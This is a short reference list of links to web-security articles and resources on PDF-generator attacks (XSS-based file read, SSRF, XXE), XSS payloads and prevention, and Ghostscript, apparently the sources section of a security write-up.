- [noob.ninja — Local File Read via XSS in Dynamically Generated PDF](https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html)
- [Intigriti — Exploiting PDF Generators: A Complete Guide to Finding SSRF Vulnerabilities](https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-pdf-generators-a-complete-guide-to-finding-ssrf-vulnerabilities-in-pdf-generators)
- [PayloadsAllTheThings — XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [Doyensec — CSPT File Upload](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [HackTricks — PDF Upload XXE and CORS Bypass](https://book.hacktricks.xyz/pentesting-web/file-upload/pdf-upload-xxe-and-cors-bypass)
- [RedTeam Pentesting — Ghostscript Overview](https://blog.redteam-pentesting.de/2023/ghostscript-overview/)
